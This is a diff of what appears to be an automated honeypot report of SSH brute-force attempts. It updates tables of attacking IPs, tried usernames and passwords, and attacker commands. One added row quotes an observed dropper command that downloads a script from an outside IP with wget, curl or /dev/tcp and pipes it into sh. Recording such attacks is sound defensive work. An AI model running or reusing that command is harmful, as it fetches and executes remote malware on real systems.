@@ -13,51 +13,51 @@ system. The table is sorted by the number of attempts.
 
 | Client IP | Count    |
 |-----------|----------|
-| 47.245.40.42 | 4097 |
-| 130.162.210.27 | 3674 |
-| 138.197.167.143 | 2944 |
-| 47.109.65.194 | 2718 |
-| 47.84.69.78 | 598 |
-| 8.130.102.128 | 258 |
-| 118.31.22.32 | 211 |
-| 39.99.154.2 | 194 |
-| 106.242.75.178 | 159 |
-| 182.92.166.28 | 159 |
+| 47.251.85.16 | 38223 |
+| 39.101.68.101 | 35187 |
+| 8.219.63.164 | 4445 |
+| 8.219.158.133 | 4270 |
+| 47.109.65.194 | 2679 |
+| 130.162.210.27 | 1359 |
+| 8.130.102.128 | 215 |
+| 143.198.145.136 | 66 |
+| 103.130.215.82 | 64 |
+| 109.94.172.86 | 64 |
 
 ### Top 10 malicious try to login as
 
 | Usernames | Count    |
 |-----------|----------|
-| root | 1632 |
-| ubuntu | 88 |
-| validator | 72 |
-| user | 70 |
-| ansible_user | 56 |
-| node | 49 |
-| test | 47 |
-| admin | 40 |
-| polkadot | 40 |
-| sammy | 26 |
+| root | 37236 |
+| admin | 18 |
+| test | 16 |
+| sammy | 13 |
+| arma | 11 |
+| hjc | 10 |
+| karimderaz | 10 |
+| chenzilong | 9 |
+| postgres | 9 |
+| bonus | 8 |
 
 ### Top 10 malicious try to authenticate with
 
 | Password | Count    |
 |-----------|----------|
-| 123456 | 461 |
-| 111111 | 66 |
-| validator | 64 |
-| 1234 | 50 |
-| node | 49 |
-| 123 | 45 |
-| 1 | 45 |
-| password | 43 |
-| defi | 40 |
-| 12345678 | 37 |
+| 123456 | 566 |
+| 1 | 24 |
+| 1234 | 21 |
+| 111111 | 19 |
+| password | 17 |
+| 12345 | 12 |
+| viktor | 10 |
+| chenzilong | 9 |
+| 12345678 | 9 |
+| zhao | 8 |
 
 ### Top malicious commands try to execute
 
 | Client | Command |
 |--------|---------|
-| 182.92.166.28 | uname -s -m |
-| 182.92.184.221 | uname -s -m |
-| 106.242.75.178 | uname -s -m |
+| 120.27.223.86 | uname -s -m |
+| 94.103.125.37 | uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; SC=$(wget -O- http://94.156.177.109/sh \|\| curl http://94.156.177.109/sh); if [ $? -ne 0 ]; then exec 3<>"/dev/tcp/94.156.177.109/80"; echo -e "GET /sh HTTP/1.0\r\nHost: 94.156.177.109\r\n\r\n" >&3; (while read -r line; do [ "$line" = $'\r' ] && break; done && cat) <&3 \| sh -s ssh; exec 3>&-; else echo "$SC" \| sh -s ssh; fi |
+| 47.251.85.16 | echo -e "\x6F\x6B" |
